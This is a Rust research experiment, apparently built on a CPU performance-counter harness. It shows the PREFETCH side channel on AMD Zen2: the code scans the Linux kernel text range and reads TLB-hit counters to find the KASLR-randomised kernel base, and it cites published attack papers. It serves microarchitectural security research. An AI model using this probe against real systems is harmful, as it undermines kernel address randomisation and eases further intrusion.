use perfect::*;
use perfect::events::*;
use perfect::stats::*;
use perfect::experiments::*;
use rand::prelude::*;
use rand::distributions::Uniform;
use std::collections::*;

fn main() {
    let mut harness = HarnessConfig::default_zen2().emit();
    PrefetchLeak::run(&mut harness);
}

/// Demonstrate some behavior of the PREFETCH instruction. 
///
/// Context
/// =======
///
/// It is widely known[^1][^2] that implementations of software prefetching 
/// [for the x86 ISA] may leak information about virtual addresses. 
///
/// In full generality, the problem is that: 
///
/// 1. An implementation of the PREFETCH instruction necessarily involves 
///    translating a "virtual" address into a "physical" address
///
/// 2. Address translation relies on the existence of a "page-table": 
///    a structure in memory whose entries define a map from virtual to 
///    physical addresses (along with permissions and other memory attributes)
///
/// 3. Practically all modern microprocessors rely heavily on implementing one 
///    or more levels of cache dedicated solely to page-table entries 
///    (a "translation lookaside buffer", or TLB)
///
/// 4. Differences in "the input to address translation" and/or "the state of 
///    the TLBs" necessarily commute into differences in the availability of 
///    fundamental shared resources (ie. power and time) that may be measured 
///    architecturally
///
/// To make matters worse: unlike most other load/store instructions in the 
/// x86 ISA, the memory operand for the PREFETCH instruction is not subject to 
/// typical permission checks and does not cause an exception when a virtual
/// address is invalid. 
///
/// With access to high-precision timers [or performance-monitoring counters],
/// this creates a situation where *unprivileged* code can infer whether or 
/// not the page-table entries defining a *privileged* virtual address space
/// are resident somewhere in the TLB hierarchy. 
///
/// This is particularly relevant in cases where system software attempts to 
/// hide information about a "privileged" address space from unprivileged 
/// users (ie. in security hardening features like KASLR).
///
/// [^1]: [Prefetch Side-Channel Attacks: Bypassing SMAP and Kernel ASLR](https://gruss.cc/files/prefetch.pdf)
/// [^2]: [AMD Prefetch Attacks through Power and Time](https://www.usenix.org/system/files/sec22-lipp.pdf)
///
/// Test
/// ====
///
/// When using KASLR, the Linux kernel's program text is randomly mapped 
/// somewhere between `0xffff_ffff_8000_0000 - `0xffff_ffff_c000_0000`. 
/// This test uses a 1MiB stride between accesses.
///
/// While measuring with PMC events for L1D TLB hits/misses:
///
/// 1. Attempt to prefetch addresses in this range
/// 2. If a mapping does not exist, we should expect to see only L2 TLB misses
/// 3. If a mapping *does* exist, we should expect to observe an L2 TLB hit
/// 4. The first address with a hit must be the base of the kernel .text
///
pub struct PrefetchLeak;
impl PrefetchLeak {

    const KTEXT_LO: usize = 0xffff_ffff_8000_0000;
    const KTEXT_HI: usize = 0xffff_ffff_c000_0000;
    const STRIDE: usize   = 0x0000_0000_0010_0000;
    const KTEXT_RANGE: std::ops::Range<usize> = 
        (Self::KTEXT_LO..Self::KTEXT_HI);

    fn emit_probe(inner: impl Fn(&mut X64AssemblerFixed)) -> X64AssemblerFixed {
        let mut f = X64AssemblerFixed::new(0x0000_0000_4001_0000, 0x4000);
        f.emit_rdpmc_start(0, Gpr::R15 as u8);
        (inner)(&mut f);
        f.emit_rdpmc_end(0, Gpr::R15 as u8, Gpr::Rax as u8);
        f.emit_ret();
        f.commit().unwrap();
        f
    }

    fn run(harness: &mut PerfectHarness) {

        // NOTE: In my case, seems like we're sensitive to the 2MiB PTEs.
        let mut events = EventSet::new();
        //events.add(Zen2Event::LsL1DTlbMiss(LsL1DtlbMissMask::TlbReload4KL2Hit));
        //events.add(Zen2Event::LsL1DTlbMiss(LsL1DtlbMissMask::TlbReload32KL2Hit));
        events.add(Zen2Event::LsL1DTlbMiss(LsL1DtlbMissMask::TlbReload2ML2Hit));
        //events.add(Zen2Event::LsL1DTlbMiss(LsL1DtlbMissMask::TlbReload1GL2Hit));
        //events.add(Zen2Event::LsNotHaltedCyc(0x00));

        let floor  = Self::emit_probe(|mut f| {});
        let mut floor_res = ExperimentCaseResults::new("");
        for event in events.iter() {
            let desc = event.as_desc();
            let results = harness.measure(floor.as_fn(), 
                desc.id(), desc.mask(), 256, InputMethod::Fixed(0, 0)
            ).unwrap();

            floor_res.record(*event, 0, results.data);
        }

        let probe  = Self::emit_probe(|mut f| { 
            dynasm!(f ; prefetch [rdi]);
        });

        for addr in Self::KTEXT_RANGE.step_by(Self::STRIDE) {
            let mut case_res = ExperimentCaseResults::new("");
            for event in events.iter() {
                let desc = event.as_desc();
                let results = harness.measure(probe.as_fn(), 
                    desc.id(), desc.mask(), 256, InputMethod::Fixed(addr, 0)
                ).unwrap();
                if results.get_max() == 0 { continue; }
                case_res.record(*event, addr, results.data);
            }
            for (event, event_results) in case_res.data.iter() {
                let edesc = event.as_desc();
                let gmin = event_results.global_min().0;
                let floor_min = floor_res.data.get(&event).unwrap()
                    .global_min().0;
                let adj_min = gmin - floor_min;

                println!("{:016x} {:?} amin={} ", addr, edesc.name(), adj_min);
            }
        }

    }
}

